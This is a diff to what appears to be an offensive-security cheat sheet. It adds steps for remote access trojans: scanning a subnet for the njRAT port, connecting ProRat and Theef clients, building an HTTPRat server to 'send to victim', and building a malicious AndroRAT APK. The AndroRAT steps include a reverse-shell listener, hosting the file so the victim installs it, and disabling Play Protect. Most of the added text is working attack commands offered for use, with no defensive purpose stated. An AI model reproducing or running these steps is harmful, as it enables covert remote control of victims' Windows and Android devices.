@@ -1450,8 +1450,22 @@ dump_sms
 app_list
 sysinfo
 --------------------------------------------------------------------------------------------------------------------------------------
+-njRAT on windows default port 5553
+nmap -p 5553 --open 192.168.10.0/24
+nmap -p- --open 192.168.10.0/24
+if does not work njrat change default port 5553 to the one found above
 
--AndroRAT: create apk malicious for reverse shell:
+-ProRat gui windows default port 5110 - click connect (password provided if not switch to njrat, httprat..)
+
+-theef rat client on windows to connect port 6703
+
+-httprat client windows specify server port, default is port 80 change to 8090 then build will create a httpserver.exe - send it to victim
+once victim execute it: http://victim.ip:8090
+
+-AndroRAT: create apk malicious for reverse shell: default port 8000
+
+python3 androRAT.py --shell -i 0.0.0.0 -p 8000 (listen and wait for client connection by installing evil.apk)
+*On Android victim browse http://192.168.31.247/share/evil.apk and install it, then attcker should have shell androRAT.
 
 python3 androRAT.py --build -i 192.168.31.188 -p 8000 -o evil.apk
 copy apk to victim Android via your http hosted web server:
@@ -1465,9 +1479,6 @@ cp evil.apk /var/www/html/share
 adb install evil.apk
 *If adb install -g evil.apk failed click on PlayStore - Play Protect - Gears/settings - disable both Scan + Harmful:
 adb install -r myapp.apk  (-r reinstall keep data) or install via GUI
-
-python3 androRAT.py --shell -i 0.0.0.0 -p 8000 (listen and wait for client connection by installing evil.apk)
-*On Android victim browse http://192.168.31.247/share/evil.apk and install it, then attcker should have shell androRAT.
 
 *Install apk manually
 adb install -g evil.apk   (-g grant all runtime permissions automatically)
@@ -1703,6 +1714,7 @@ http://snarkles.net/scripts/sneak/sneak.php
 http://utf-8.jp/public/jjencode.html
 
 http://ddecode.com/phpdecoder/
+
 
 
 
